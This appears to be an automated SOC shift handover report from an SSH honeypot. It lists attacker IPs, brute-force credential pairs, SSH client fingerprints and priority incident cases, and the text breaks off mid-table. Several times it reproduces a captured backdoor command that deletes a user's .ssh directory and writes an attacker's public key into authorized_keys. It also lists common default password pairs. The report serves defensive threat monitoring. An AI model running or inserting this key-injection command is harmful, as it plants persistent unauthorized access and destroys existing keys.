# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-01 |
| **Generated At** | 2026-11-01T03:02:59Z |
| **Shift Time** | 03:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **76** |
| Confirmed Threats | **64** |
| False Positives Filtered | **12** (15.8%) |
| Unique Attacker IPs | **49** |
| Countries of Origin | **21** |
| High Severity Cases | **34** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **42** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **425** |
| Unique Credential Pairs | **369** |
| Unique Usernames | **207** |
| Unique Passwords | **326** |
| Successful Auth Pairs | **378** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 74 |
| `ubuntu` | 59 |
| `345gs5662d34` | 23 |
| `bitrix` | 8 |
| `support` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 23 |
| `3245gs5662d34` | 22 |
| `123456` | 13 |
| `12345678` | 7 |
| `123` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 23 |
| `root` | `3245gs5662d34` | 8 |
| `support` | `support` | 4 |
| `root` | `123456` | 4 |
| `root` | `admin` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin` | `138.226.239.233` | 2026-11-01T00:12:00 |
| `camera` | `123` | `10.0.0.73` | 2026-11-01T00:21:35 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-11-01T00:21:37 |
| `camera` | `3245gs5662d34` | `10.0.0.73` | 2026-11-01T00:21:37 |
| `rich` | `rich` | `102.210.149.105` | 2026-11-01T00:21:43 |
| `345gs5662d34` | `345gs5662d34` | `102.210.149.105` | 2026-11-01T00:21:48 |
| `rich` | `3245gs5662d34` | `102.210.149.105` | 2026-11-01T00:21:49 |
| `root` | `Lky123456` | `10.0.0.73` | 2026-11-01T00:27:39 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-11-01T00:27:44 |
| `apps` | `apps` | `10.0.0.73` | 2026-11-01T00:28:39 |
| `apps` | `3245gs5662d34` | `10.0.0.73` | 2026-11-01T00:28:44 |
| `openhabian` | `openhabian` | `10.0.0.73` | 2026-11-01T00:31:47 |
| `support` | `support` | `10.0.0.73` | 2026-11-01T00:34:12 |
| `support` | `supportAtlanta` | `138.226.239.233` | 2026-11-01T00:40:47 |
| `support` | `support` | `176.53.159.196` | 2026-11-01T00:41:33 |
| `support` | `supportAtlanta` | `10.0.0.73` | 2026-11-01T00:48:35 |
| `ansadmin` | `ansadmin` | `181.191.194.175` | 2026-11-01T00:59:55 |
| `345gs5662d34` | `345gs5662d34` | `181.191.194.175` | 2026-11-01T00:59:58 |
| `ansadmin` | `3245gs5662d34` | `181.191.194.175` | 2026-11-01T00:59:59 |
| `admin` | `admin1` | `42.51.44.110` | 2026-11-01T01:00:42 |
_… 358 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **76** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 25 |
| libssh | 11 |
| OpenSSH | 5 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 20 | 1 |
| `f555226df196...` | Mirai/variant | 6 | 3 |
| `c11b200866cf...` | Modern SSH client | 2 | 1 |
| `bc9e7273cde2...` | Mirai/variant | 1 | 1 |
| `390ffe68a68c...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 20 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 6 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `c11b200866cf...` | OpenSSH | 2 | 1 | Modern SSH client |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 1 | 1 | Modern SSH client |
| `864cef7e4d8a...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **24** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `42.51.44.110`, `181.191.194.175`, `102.210.149.105`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **49** |
| Unique ASNs | **31** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 14 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS134674` | TATA PLAY BROADBAND PRIVATE LIMITED | 1 | HIGH |
| `AS211680` | NSEC - Sistemas Informaticos, S.A. | 1 | HIGH |
| `AS14593` | Space Exploration Technologies Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (31)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-efc93c11bf94

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-11-01 00:11 |
| **Last Seen** | 2026-11-01 00:12 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 00:11:59` | `cowrie.session.connect` |
| `2026-11-01 00:11:59` | `cowrie.client.version` |
| `2026-11-01 00:11:59` | `cowrie.client.kex` |
| `2026-11-01 00:12:00` | `cowrie.login.success` |
| `2026-11-01 00:12:04` | `cowrie.direct-tcpip.request` |
| `2026-11-01 00:12:05` | `cowrie.direct-tcpip.ja4` |
| `2026-11-01 00:12:05` | `cowrie.direct-tcpip.data` |
| `2026-11-01 00:12:07` | `cowrie.direct-tcpip.request` |
| `2026-11-01 00:12:11` | `cowrie.direct-tcpip.ja4` |
| `2026-11-01 00:12:11` | `cowrie.direct-tcpip.data` |
| `2026-11-01 00:12:16` | `cowrie.direct-tcpip.request` |
| `2026-11-01 00:12:21` | `cowrie.direct-tcpip.ja4` |
| `2026-11-01 00:12:21` | `cowrie.direct-tcpip.data` |
| `2026-11-01 00:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-380415acb4d1

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]105` |
| **First Seen** | 2026-11-01 00:21 |
| **Last Seen** | 2026-11-01 00:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 00:21:42` | `cowrie.session.connect` |
| `2026-11-01 00:21:42` | `cowrie.client.version` |
| `2026-11-01 00:21:43` | `cowrie.client.kex` |
| `2026-11-01 00:21:43` | `cowrie.login.success` |
| `2026-11-01 00:21:44` | `cowrie.session.params` |
| `2026-11-01 00:21:44` | `cowrie.command.input` |
| `2026-11-01 00:21:44` | `cowrie.command.failed` |
| `2026-11-01 00:21:45` | `cowrie.log.closed` |
| `2026-11-01 00:21:46` | `cowrie.session.params` |
| `2026-11-01 00:21:46` | `cowrie.command.input` |
| `2026-11-01 00:21:46` | `cowrie.session.file_download` |
| `2026-11-01 00:21:46` | `cowrie.log.closed` |
| `2026-11-01 00:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]105` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16ac86671507

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]105` |
| **First Seen** | 2026-11-01 00:21 |
| **Last Seen** | 2026-11-01 00:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 00:21:47` | `cowrie.session.connect` |
| `2026-11-01 00:21:47` | `cowrie.client.version` |
| `2026-11-01 00:21:47` | `cowrie.client.kex` |
| `2026-11-01 00:21:48` | `cowrie.login.success` |
| `2026-11-01 00:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]105` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad886563d2a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-01 00:41 |
| **Last Seen** | 2026-11-01 00:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 00:41:32` | `cowrie.session.connect` |
| `2026-11-01 00:41:32` | `cowrie.client.version` |
| `2026-11-01 00:41:33` | `cowrie.client.kex` |
| `2026-11-01 00:41:33` | `cowrie.login.success` |
| `2026-11-01 00:41:33` | `cowrie.direct-tcpip.request` |
| `2026-11-01 00:41:33` | `cowrie.direct-tcpip.data` |
| `2026-11-01 00:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8300c3d63d5d

| Field | Detail |
|---|---|
| **Source IP** | `181.191.194[.]175` |
| **First Seen** | 2026-11-01 00:59 |
| **Last Seen** | 2026-11-01 00:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 00:59:54` | `cowrie.session.connect` |
| `2026-11-01 00:59:54` | `cowrie.client.version` |
| `2026-11-01 00:59:54` | `cowrie.client.kex` |
| `2026-11-01 00:59:55` | `cowrie.login.success` |
| `2026-11-01 00:59:55` | `cowrie.session.params` |
| `2026-11-01 00:59:55` | `cowrie.command.input` |
| `2026-11-01 00:59:55` | `cowrie.command.failed` |
| `2026-11-01 00:59:56` | `cowrie.log.closed` |
| `2026-11-01 00:59:57` | `cowrie.session.params` |
| `2026-11-01 00:59:57` | `cowrie.command.input` |
| `2026-11-01 00:59:57` | `cowrie.session.file_download` |
| `2026-11-01 00:59:57` | `cowrie.log.closed` |
| `2026-11-01 00:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.191.194[.]175` to AbuseIPDB if not already reported
- [ ] Block `181.191.194[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa6a597145a9

| Field | Detail |
|---|---|
| **Source IP** | `181.191.194[.]175` |
| **First Seen** | 2026-11-01 00:59 |
| **Last Seen** | 2026-11-01 00:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 00:59:57` | `cowrie.session.connect` |
| `2026-11-01 00:59:57` | `cowrie.client.version` |
| `2026-11-01 00:59:57` | `cowrie.client.kex` |
| `2026-11-01 00:59:58` | `cowrie.login.success` |
| `2026-11-01 00:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.191.194[.]175` to AbuseIPDB if not already reported
- [ ] Block `181.191.194[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-396fc00f5b1c

| Field | Detail |
|---|---|
| **Source IP** | `42.51.44[.]110` |
| **First Seen** | 2026-11-01 01:00 |
| **Last Seen** | 2026-11-01 01:04 |
| **Session Duration** | 245s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:00:41` | `cowrie.session.connect` |
| `2026-11-01 01:00:41` | `cowrie.client.version` |
| `2026-11-01 01:00:41` | `cowrie.client.kex` |
| `2026-11-01 01:00:42` | `cowrie.login.success` |
| `2026-11-01 01:00:44` | `cowrie.session.params` |
| `2026-11-01 01:00:44` | `cowrie.command.input` |
| `2026-11-01 01:00:44` | `cowrie.command.failed` |
| `2026-11-01 01:00:44` | `cowrie.log.closed` |
| `2026-11-01 01:00:45` | `cowrie.session.params` |
| `2026-11-01 01:00:45` | `cowrie.command.input` |
| `2026-11-01 01:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.44[.]110` to AbuseIPDB if not already reported
- [ ] Block `42.51.44[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a159cc56c56d

| Field | Detail |
|---|---|
| **Source IP** | `42.51.44[.]110` |
| **First Seen** | 2026-11-01 01:00 |
| **Last Seen** | 2026-11-01 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:00:59` | `cowrie.session.connect` |
| `2026-11-01 01:00:59` | `cowrie.client.version` |
| `2026-11-01 01:00:59` | `cowrie.client.kex` |
| `2026-11-01 01:01:00` | `cowrie.login.success` |
| `2026-11-01 01:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.44[.]110` to AbuseIPDB if not already reported
- [ ] Block `42.51.44[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9655e5f247d9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-11-01 01:08 |
| **Last Seen** | 2026-11-01 01:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:08:59` | `cowrie.session.connect` |
| `2026-11-01 01:08:59` | `cowrie.client.version` |
| `2026-11-01 01:08:59` | `cowrie.client.kex` |
| `2026-11-01 01:08:59` | `cowrie.login.success` |
| `2026-11-01 01:08:59` | `cowrie.direct-tcpip.request` |
| `2026-11-01 01:09:00` | `cowrie.direct-tcpip.ja4` |
| `2026-11-01 01:09:00` | `cowrie.direct-tcpip.data` |
| `2026-11-01 01:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9948f6dd64b5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:11 |
| **Last Seen** | 2026-11-01 01:12 |
| **Session Duration** | 88s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_51f24961db9be42ff99bb5d357999d98_small_control'"'"' '"'"'check_51f24961db9be42ff99bb5d357999d98'"'"'', printf '\n%s|%s\n' 'check_51f24961db9be42ff99bb5d357999d98_small_control' 'check_51f24961db9be42ff99bb5d357999d98', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_51f24961db9be42ff99bb5d357999d98_small_math'"'"' "$((42*948+27))"', (42*948+27, printf '\n%s|%s\n' 'check_51f24961db9be42ff99bb5d357999d98_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:11:14` | `cowrie.session.connect` |
| `2026-11-01 01:11:14` | `cowrie.client.version` |
| `2026-11-01 01:11:14` | `cowrie.client.kex` |
| `2026-11-01 01:11:17` | `cowrie.login.success` |
| `2026-11-01 01:11:18` | `cowrie.client.size` |
| `2026-11-01 01:11:20` | `cowrie.session.params` |
| `2026-11-01 01:11:20` | `cowrie.command.input` |
| `2026-11-01 01:11:20` | `cowrie.command.input` |
| `2026-11-01 01:11:20` | `cowrie.command.input` |
| `2026-11-01 01:11:20` | `cowrie.command.input` |
| `2026-11-01 01:11:20` | `cowrie.command.input` |
| `2026-11-01 01:11:20` | `cowrie.command.input` |
| `2026-11-01 01:11:20` | `cowrie.command.input` |
| `2026-11-01 01:11:20` | `cowrie.command.input` |
| `2026-11-01 01:11:20` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1da2d1e75938

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:13 |
| **Last Seen** | 2026-11-01 01:14 |
| **Session Duration** | 84s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dd08865a0ebb1326d7fb3df9d4e641f2_small_control'"'"' '"'"'check_dd08865a0ebb1326d7fb3df9d4e641f2'"'"'', printf '\n%s|%s\n' 'check_dd08865a0ebb1326d7fb3df9d4e641f2_small_control' 'check_dd08865a0ebb1326d7fb3df9d4e641f2', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dd08865a0ebb1326d7fb3df9d4e641f2_small_math'"'"' "$((753*701+34))"', (753*701+34, printf '\n%s|%s\n' 'check_dd08865a0ebb1326d7fb3df9d4e641f2_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:13:27` | `cowrie.session.connect` |
| `2026-11-01 01:13:28` | `cowrie.client.version` |
| `2026-11-01 01:13:28` | `cowrie.client.kex` |
| `2026-11-01 01:13:31` | `cowrie.login.success` |
| `2026-11-01 01:13:33` | `cowrie.client.size` |
| `2026-11-01 01:13:34` | `cowrie.session.params` |
| `2026-11-01 01:13:35` | `cowrie.command.input` |
| `2026-11-01 01:13:35` | `cowrie.command.input` |
| `2026-11-01 01:13:35` | `cowrie.command.input` |
| `2026-11-01 01:13:35` | `cowrie.command.input` |
| `2026-11-01 01:13:35` | `cowrie.command.input` |
| `2026-11-01 01:13:35` | `cowrie.command.input` |
| `2026-11-01 01:13:35` | `cowrie.command.input` |
| `2026-11-01 01:13:35` | `cowrie.command.input` |
| `2026-11-01 01:13:35` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77c5489a06be

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:15 |
| **Last Seen** | 2026-11-01 01:17 |
| **Session Duration** | 88s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a917454a644cc8c271134aec6dca7981_small_control'"'"' '"'"'check_a917454a644cc8c271134aec6dca7981'"'"'', printf '\n%s|%s\n' 'check_a917454a644cc8c271134aec6dca7981_small_control' 'check_a917454a644cc8c271134aec6dca7981', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a917454a644cc8c271134aec6dca7981_small_math'"'"' "$((417*892+26))"', (417*892+26, printf '\n%s|%s\n' 'check_a917454a644cc8c271134aec6dca7981_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:15:41` | `cowrie.session.connect` |
| `2026-11-01 01:15:42` | `cowrie.client.version` |
| `2026-11-01 01:15:42` | `cowrie.client.kex` |
| `2026-11-01 01:15:44` | `cowrie.login.success` |
| `2026-11-01 01:15:46` | `cowrie.client.size` |
| `2026-11-01 01:15:47` | `cowrie.session.params` |
| `2026-11-01 01:15:48` | `cowrie.command.input` |
| `2026-11-01 01:15:48` | `cowrie.command.input` |
| `2026-11-01 01:15:48` | `cowrie.command.input` |
| `2026-11-01 01:15:48` | `cowrie.command.input` |
| `2026-11-01 01:15:48` | `cowrie.command.input` |
| `2026-11-01 01:15:48` | `cowrie.command.input` |
| `2026-11-01 01:15:48` | `cowrie.command.input` |
| `2026-11-01 01:15:48` | `cowrie.command.input` |
| `2026-11-01 01:15:48` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-366c008e7acb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:17 |
| **Last Seen** | 2026-11-01 01:19 |
| **Session Duration** | 80s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cd2b0262c21897ae48fe050e7c006658_small_control'"'"' '"'"'check_cd2b0262c21897ae48fe050e7c006658'"'"'', printf '\n%s|%s\n' 'check_cd2b0262c21897ae48fe050e7c006658_small_control' 'check_cd2b0262c21897ae48fe050e7c006658', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cd2b0262c21897ae48fe050e7c006658_small_math'"'"' "$((680*611+47))"', (680*611+47, printf '\n%s|%s\n' 'check_cd2b0262c21897ae48fe050e7c006658_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:17:55` | `cowrie.session.connect` |
| `2026-11-01 01:17:55` | `cowrie.client.version` |
| `2026-11-01 01:17:55` | `cowrie.client.kex` |
| `2026-11-01 01:18:00` | `cowrie.login.success` |
| `2026-11-01 01:18:02` | `cowrie.client.size` |
| `2026-11-01 01:18:03` | `cowrie.session.params` |
| `2026-11-01 01:18:03` | `cowrie.command.input` |
| `2026-11-01 01:18:03` | `cowrie.command.input` |
| `2026-11-01 01:18:03` | `cowrie.command.input` |
| `2026-11-01 01:18:03` | `cowrie.command.input` |
| `2026-11-01 01:18:03` | `cowrie.command.input` |
| `2026-11-01 01:18:03` | `cowrie.command.input` |
